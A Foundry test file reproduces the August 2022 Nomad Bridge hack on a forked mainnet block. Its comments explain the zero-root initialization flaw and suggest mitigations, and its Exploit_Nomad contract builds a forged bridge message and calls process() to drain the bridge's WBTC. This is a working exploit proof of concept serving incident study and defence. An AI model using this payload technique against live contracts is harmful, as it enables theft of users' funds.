// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IERC20} from "../interfaces/IERC20.sol";

import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';

// forge test --match-contract Exploit_Nomad -vvv
/*
On Aug 1st, 2022 ~190MM AMOUNT were stole from Nomad Bridge because of a bad initialization of the tree root.
As a result, attackers (and whitehats) were allowed to bypass the message verification claiming tokens for free from the bridge.

// Attack Overview
Total Lost: ~190MM (some of which were returned by whitehats);
Nomad's Bad Initialization: https://etherscan.io/tx/0x53fd92771d2084a9bf39a6477015ef53b7f116c79d98a21be723d06d79024cad
Nomad's Bad Implementation: https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code
Attack Txs: https://moonscan.io/tx/0xcca9299c739a1b538150af007a34aba516b6dade1965e80198be021e3166fe4c
Attack Txs: https://etherscan.io/tx/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460

// Key Info Sources
samczsun : https://twitter.com/samczsun/status/1554252024723546112
ParadigmEng420 : https://twitter.com/paradigmeng420/status/1554249610574450688
0xfoobar : https://twitter.com/0xfoobar/status/1554269062653411334
CertiK : https://twitter.com/CertiKAlert/status/1554305088037978113
Beosin : https://twitter.com/BeosinAlert/status/1554303803218083842
Blocksec : https://twitter.com/BlockSecTeam/status/1554335271964987395
CertiK post-mortem : https://www.certik.com/resources/blog/28fMavD63CpZJOKOjb9DX3-nomad-bridge-exploit-incident-analysis

Principle: Bad root commitment, root verification bypass

    function initialize(uint32 _remoteDomain, address _updater, bytes32 _committedRoot, uint256 _optimisticSeconds) public initializer {
        __NomadBase_initialize(_updater);
        // set storage variables
        entered = 1;
        remoteDomain = _remoteDomain;
        committedRoot = _committedRoot;
        // pre-approve the committed root.
        confirmAt[_committedRoot] = 1;
        _setOptimisticTimeout(_optimisticSeconds);
    }

    function process(bytes memory _message) public returns (bool _success) {
        // ensure message was meant for this domain
        bytes29 _m = _message.ref(0);
        require(_m.destination() == localDomain, "!destination");
        // ensure message has been proven
        bytes32 _messageHash = _m.keccak();
        require(acceptableRoot(messages[_messageHash]), "!proven");
        // check re-entrancy guard
        require(entered == 1, "!reentrant");
        entered = 0;
        // update message status as processed
        messages[_messageHash] = LEGACY_STATUS_PROCESSED;
        // call handle function
        IMessageRecipient(_m.recipientAddress()).handle(
            _m.origin(),
            _m.nonce(),
            _m.sender(),
            _m.body().clone()
        );
        // emit process results
        emit Process(_messageHash, true, "");
        // reset re-entrancy guard
        entered = 1;
        // return true
        return true;
    }

    function acceptableRoot(bytes32 _root) public view returns (bool) {
        // this is backwards-compatibility for messages proven/processed
        // under previous versions
        if (_root == LEGACY_STATUS_PROVEN) return true;
        if (_root == LEGACY_STATUS_PROCESSED) return false;

        uint256 _time = confirmAt[_root];
        if (_time == 0) {
            return false;
        }
        return block.timestamp >= _time;
    }

VULNERABILITY:
1. The contract was deployed with `commitedRoot` set to zero.
2. `confirmAt[commitedRoot]` is set to non-zero
3. Passing any message which is not present in `messages[_messageHash]` sends `0x00` to `acceptableRoot`
4. `acceptRoot` will check `confirmAt[0x00]` which is non-zero, so will always return true (the timestamp is always bigger than one)

ATTACK:
The nature of this attack was pretty like a snowball that only required copying the calls others were performing because no external contracts or exploits were needed.
A free-for-all acceptableRoot was commited on initialization (bytes32(0)) which allowed users to bypass the msg checks claiming 100 WBTC per tx on the ETH side of the bridge.
1) Bridge 0.1 WBTC from Moonbeam to Mainnet
2) Claim 100 WBTC by sending a message with message that bypasses "require(acceptableRoot(messages[_messageHash]), "!proven");"
3) Repeat

MITIGATIONS:
As the root of this attack was a bad initialization value that affected message validation, there are two critical aspects that could be taken into account:
1) Evaluate if a specific initialization value could impact on the key functions of the contracts.
2) Evaluate while validating messages if there are values that should not be provided by users as inputs (e.g bytes32(0) for signatures or roots).
*/

interface INomadReplica {
    function initialize(uint32 _remoteDomain, address _updater, bytes32 _committedRoot, uint256 _optimisticSeconds) external; 
    function process(bytes memory _message) external returns (bool _success);
    function acceptableRoot(bytes32 _root) external view returns (bool);
}

contract Exploit_Nomad is TestHarness, TokenBalanceTracker {

    address internal constant NOMAD_DEPLOYER = 0xA5bD5c661f373256c0cCfbc628Fd52DE74f9BB55;
    address internal constant attacker = address(0xa8C83B1b30291A3a1a118058b5445cC83041Cd9d);

    uint32 internal constant ETHEREUM = 0x657468;   // "eth"
    uint32 internal constant MOONBEAM = 0x6265616d; // "beam"

    INomadReplica internal constant replicaProxy = INomadReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
    INomadReplica internal constant replica = INomadReplica(0xB92336759618F55bd0F8313bd843604592E27bd8);
    
    address internal constant bridgeRouter = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
    address internal constant ercBridge = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;

    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function setUp() external {
        cheat.createSelectFork("mainnet", 15259100); // We pin one block before the attacker starts to drain the bridge after he sent the 0.1 WBTC tx on Moonbeam.
        cheat.label(NOMAD_DEPLOYER, "Nomad Deployer");

        addTokenToTracker(address(WBTC));
        
        console.log("\nInitial balances:");
        updateBalanceTracker(ercBridge);
        updateBalanceTracker(attacker);

        logBalancesWithLabel("Bridge", ercBridge);
        logBalancesWithLabel("Attacker", attacker);
    }

    function test_attack() external {

        bytes memory payload = getPayload(attacker, address(WBTC), WBTC.balanceOf(ercBridge));
        emit log_named_bytes("\nTx Payload", payload); 
        
        cheat.prank(attacker);
        bool success = replicaProxy.process(payload);
        require(success, "Process failed");

        console.log("\nFinal balances:");
        logBalancesWithLabel("Bridge", ercBridge);
        logBalancesWithLabel("Attacker", attacker);
    }

    function getPayload(address recipient, address token, uint256 amount) public pure returns (bytes memory) {

        bytes memory payload = abi.encodePacked(
            MOONBEAM,                               // Home chain domain
            uint256(uint160(bridgeRouter)),         // Sender: bridge
            uint32(0),                              // Dst nonce
            ETHEREUM,                               // Dst chain domain
            uint256(uint160(ercBridge)),            // Recipient (Nomad ERC20 bridge)
            ETHEREUM,                               // Token domain
            uint256(uint160(token)),              // token id (e.g. WBTC)
            uint8(0x3),                             // Type - transfer
            uint256(uint160(recipient)),          // Recipient of the transfer
            uint256(amount),                      // Amount (e.g. 10000000000)
            uint256(0)                  // Optional: Token details hash
                                        // keccak256(                  
                                        //     abi.encodePacked(
                                        //         bytes(tokenName).length,
                                        //         tokenName,
                                        //         bytes(tokenSymbol).length,
                                        //         tokenSymbol,
                                        //         tokenDecimals
                                        //     )
                                        // ) 
        );

        return payload;
    }
}
